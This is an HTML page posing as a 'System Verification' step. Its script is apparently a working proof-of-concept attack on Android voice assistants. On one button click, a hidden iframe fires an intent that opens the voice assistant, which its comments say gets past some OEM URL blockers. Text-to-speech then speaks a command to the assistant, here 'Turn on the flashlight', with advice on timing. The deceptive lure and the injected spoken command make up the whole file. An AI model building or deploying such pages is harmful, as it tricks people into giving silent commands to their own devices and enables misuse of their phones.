<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #111; color: #fff; margin: 0; }
        button { padding: 20px 40px; font-size: 22px; background: #00c853; color: white; border: none; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 10px rgba(0,200,83,0.4); }
    </style>
</head>
<body>
    <button id="btn">Verify to Continue</button>

    <script>
        let exploited = false;

        document.getElementById('btn').addEventListener('click', function() {
            if (exploited) return;
            exploited = true;

            // 1. Synchronous TTS Unlock
            window.speechSynthesis.speak(new SpeechSynthesisUtterance(""));

            // 2. Fire the Intent via iframe injection (bypasses some OEM URL blockers)
            let intentUrl = "intent:#Intent;" +
                "action=android.intent.action.VOICE_COMMAND;" +
                "launchFlags=0x10000000;" + // FLAG_ACTIVITY_NEW_TASK
                "end";
            
            let iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = intentUrl;
            document.body.appendChild(iframe);

            // 3. Fire the Acoustic Payload
            // Using 600ms as a baseline. If it speaks too early, increase to 800.
            setTimeout(() => {
                let msg = new SpeechSynthesisUtterance("Turn on the flashlight");
                msg.lang = 'en-US';
                msg.rate = 1.3; 
                msg.volume = 1.0;
                window.speechSynthesis.speak(msg);
            }, 600); 
        });
    </script>
</body>
</html>
